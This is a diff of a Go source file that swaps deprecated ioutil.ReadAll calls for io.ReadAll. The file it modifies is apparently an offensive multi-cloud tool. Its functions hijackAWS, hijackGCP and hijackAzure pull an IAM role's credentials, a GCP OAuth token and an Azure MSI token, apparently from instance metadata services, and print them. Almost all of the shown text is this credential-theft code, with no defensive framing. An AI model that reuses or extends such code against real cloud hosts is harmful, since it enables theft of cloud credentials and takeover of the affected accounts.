@@ -2,7 +2,7 @@ package multi_cloud
 
 import (
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net/http"
 	"strings"
 	"time"
@@ -80,7 +80,7 @@ func hijackAWS() {
 		return
 	}
 	defer roleResp.Body.Close()
-	roleNameRaw, _ := ioutil.ReadAll(roleResp.Body)
+	roleNameRaw, _ := io.ReadAll(roleResp.Body)
 	roleName := strings.TrimSpace(string(roleNameRaw))
 
 	// Get credentials
@@ -91,7 +91,7 @@ func hijackAWS() {
 		return
 	}
 	defer credResp.Body.Close()
-	creds, _ := ioutil.ReadAll(credResp.Body)
+	creds, _ := io.ReadAll(credResp.Body)
 
 	fmt.Println("[+] IAM Role:", roleName)
 	fmt.Println("[+] Credentials:\n", string(creds))
@@ -109,7 +109,7 @@ func hijackGCP() {
 		return
 	}
 	defer resp.Body.Close()
-	token, _ := ioutil.ReadAll(resp.Body)
+	token, _ := io.ReadAll(resp.Body)
 
 	fmt.Println("[+] OAuth Token:\n", string(token))
 }
@@ -126,7 +126,7 @@ func hijackAzure() {
 		return
 	}
 	defer resp.Body.Close()
-	token, _ := ioutil.ReadAll(resp.Body)
+	token, _ := io.ReadAll(resp.Body)
 
 	fmt.Println("[+] MSI Token:\n", string(token))
 }
